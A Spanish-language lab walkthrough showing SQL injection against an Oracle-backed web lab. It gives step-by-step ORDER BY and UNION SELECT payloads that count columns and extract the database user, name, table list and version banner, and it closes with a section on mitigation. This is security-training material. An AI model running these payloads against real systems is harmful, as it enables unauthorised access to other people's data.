Objetivo del laboratorio:

 - Es identificar el sistema de gestión de bases de datos (DBMS) utilizando por la aplicación y determinar su versión mediante una inyección SQL 

Explicación Técnica 

>  En este caso se plantea una vulnerabilidad en la aplicación web que permite a un atacante modificar consultas SQL legitimas. Al explotar esta debilidad, es posible extraer información sobre la tecnología utilizada en el backend. Igualmente se identifica el sistema de datos relacional subyacente utilizado por el sitio web.

> Las bases de datos Oracle tienen estructuras y métodos específicos para almacenar detalles sobre su versión. Al manipular las consultas de la aplicación, un atacante puede hacer que el sistema devuelva datos internos que normalmente no deberían ser accesibles. 

Primero vamos a capturar el código de la pagina y lo enviaremos al Repeater

![image](https://github.com/user-attachments/assets/418b6ff3-f6af-44e1-8abd-efd556a85009)

ahora en Repeater vamos a empezar a modificar las solicitudes con "ORDER", Primero vamos a probar con este: 

     '+order+by+1--

*Explicación del código*: Este código es una prueba de inyección que usa la clausula "ORDER BY" para determinar el numero de columnas en una consulta. 

-  ORDER BY 1: Intenta ordenar los resultados por la primera columna
- -- : Comenta el resto de la consulta para evitar errores.  

que debería; si es que la vulnerabilidad esta, darnos una respuesta "200 OK"

![image](https://github.com/user-attachments/assets/18f9227e-3c1a-4cfb-a877-b52171d0c4a0)

modificamos el GET y veremos que nos da la respuesta esperada. y como vemos que esta consulta funciona es que al menos una columna existe. o sea que podemos probar con aumentar el numero por ejemplo:

     '+order+by+2--

o con

     '+order+by+3--

![image](https://github.com/user-attachments/assets/31ed70f4-7f9f-4b66-87bd-657c5f36598d)

y por ultimo probamos con el "3"

![image](https://github.com/user-attachments/assets/8640cb4b-4cc8-4039-88d5-c05bfd987f1b)

pero con el numero 3 nos da "server error" o sea que solo hay "2" columnas. lo que ahora vamos a probar con otra consulta. 

     '+UNION+SELECT+NULL,NULL+FROM+dual-- 

*Explicación del código*: 

- UNION SELECT: intenta unir otra consulta a la existente
- NULL, NULL: se usa para igualar el numero de columnas de la consulta original
- FROM dual: en oracle, dual es una tabla especial utilizada para obtener resultados sin acceder a datos reales. 

![image](https://github.com/user-attachments/assets/67e00c5b-c5aa-4387-93f7-c88517535922)

y como vemos tenemos la respuesta de "200 OK" mas el código, asi que vamos a validar el tipo de dato por cada campo

![image](https://github.com/user-attachments/assets/fd8fbc95-f963-4fcd-b4ad-3c5526801c51)

Como vemos muestra el resultado o sea que si probamos con cadenas de texto para comprobar si los campos aceptan valores tipos STRING, el codigo quedaria 

     '+UNION+SELECT+'Spartan','Prueba de vulnerabilidad'+FROM+dual--

La relación con la validación de tipos de datos: 

> Al ejecutar esta inyección, si la consulta no genera errores que no fue el caso, significa que los campos aceptan valores de tipo "texto", si da un error, se debe probar con los otros tipos de datos como numérico o fechas. hasta encontrar la combinación correcta. Esto ayuda a preparar ataques mas avanzados, como por ejemplos extracción de datos sensibles. 

ahora como sabemos que tenemos resultado en eso, vamos a probar con algun usuario que pueda ver. 

     '+UNION+SELECT+user,'prueba 2 de vul'+FROM+dual-- HTTP/2

![image](https://github.com/user-attachments/assets/b3784b61-803c-4c3c-8a6a-87f39ed608d7)

y como vemos tenemos resultado, nos da el usuario "Peter" que es el usuario predeterminado del laboratorio. ahora vamos a probar un payload para obtener nombres de la base de datos. 

     '+UNION+SELECT+sys.database_name,'prueba 3 vuln'+FROM+dual-- 

![image](https://github.com/user-attachments/assets/a07c23d1-7536-429e-8efb-aa80d98533a6)

y obtenemos resultado con el "XE", también podemos probar con obtener las tablas

     '+UNION+SELECT+table_name,+NULL+FROM+all_tables-- 

![image](https://github.com/user-attachments/assets/50d91c5a-e698-4ea6-98d4-33b4151817b6)

tenemos las tablas de la base de datos, ahora vamos a probar con consultar la versión de BD

> *Extraer la versión del motor de base de datos*: ahora que sabemos que cantidad y tipo de columnas aceptadas en la consulta, es posible usar funciones especificas del DBMS para obtener su versión. Esto en un ataque ayuda a identificar vulnerabilidades conocidas en esa versión que hay y planificar ataques mas avanzados.  

![image](https://github.com/user-attachments/assets/212afb7c-8fae-4aa7-ba82-2ed9f1862281)

entonces probamos el comando: 

     '+UNION+SELECT+BANNER,+NULL+FROM+v$version--

y vemos que nos entrega la versión por la cual podemos ver explotaciones. 

> Mitigación: 

La mitigación de la inyección SQL  se logra usando consultas preparadas, que separan los datos del código SQL y validando entradas para asegurarse de que solo se acepten datos esperandos. los  los *ORMs* generan consultas seguras sin concatenar datos manualmente, mientras que el principio de menor privilegio limita los permisos de los usuarios en la base de datos. Deshabilitando mensajes de error detallados, impide que los atacantes obtengan información sobre la estructura de la base de datos. 

> ORMs --> son herramientas que permiten interactuar con base de datos utilizando objetos en lugar de escribir consultas SQL manualmente. Con ORMs los desarrolladores pueden trabajar con datos de la base de datos como si fuera objetos en el código. lo que abstrae la complejidad de las consultas SQL. o sea que esto evita problemas como la inyección SQL, ya que las consultas se generan automáticamente y los datos se manejan de manera segura. 
